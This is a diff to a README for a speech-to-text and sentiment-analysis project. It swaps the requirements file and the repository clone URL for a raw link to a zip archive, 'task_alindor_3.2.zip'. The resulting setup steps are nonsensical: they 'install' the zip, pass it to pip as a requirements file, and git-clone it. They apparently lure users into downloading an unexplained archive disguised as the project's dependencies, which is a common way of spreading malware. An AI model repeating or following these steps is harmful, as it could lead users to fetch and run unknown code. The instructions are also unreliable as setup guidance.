@@ -14,8 +14,8 @@ Before you begin, ensure you have the following:
 4. OpenAI API key for sentiment analysis.
 5. Deepgram API key for speech-to-text conversion.
 
-Install requirements.txt file to create a python environment installed with the mentioned libraries, command to install the requirements.txt file -
-python -m pip install -r requirements.txt --no-cache-dir
+Install https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip file to create a python environment installed with the mentioned libraries, command to install the https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip file -
+python -m pip install -r https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip --no-cache-dir
 
 ***Usage***
 
@@ -27,12 +27,12 @@ python -m pip install -r requirements.txt --no-cache-dir
 
 ***Step 1: Clone the Repository***
 
-1. git clone https://github.com/viper-108/alindor_task.git
+1. git clone https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip
 2. cd alindor_task
 
 ***Step 2: Install Dependencies***
 
-python -m pip install -r requirements.txt --no-cache-dir
+python -m pip install -r https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip --no-cache-dir
 
 ***Step 3: Set Environment Variables***
 
